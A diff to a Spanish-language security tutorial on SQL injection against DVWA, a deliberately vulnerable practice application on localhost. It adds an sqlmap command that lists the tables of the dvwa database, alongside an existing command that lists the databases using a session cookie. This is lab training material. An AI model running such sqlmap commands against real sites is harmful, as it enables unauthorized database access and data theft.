@@ -248,7 +248,10 @@ sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=2&Submit=Submit#" --co
 ```bash
 sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=dqpmagfo58rgidbrdjp0vcu763" --dbs --batch
 ```
-
+#### Ver las tablas de las bases de datos:
+```bash
+sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=dqpmagfo58rgidbrdjp0vcu763" -D dvwa --tables --batch
+```
 
 Puedes ver el video del ejemplo en el siguiente link:
 
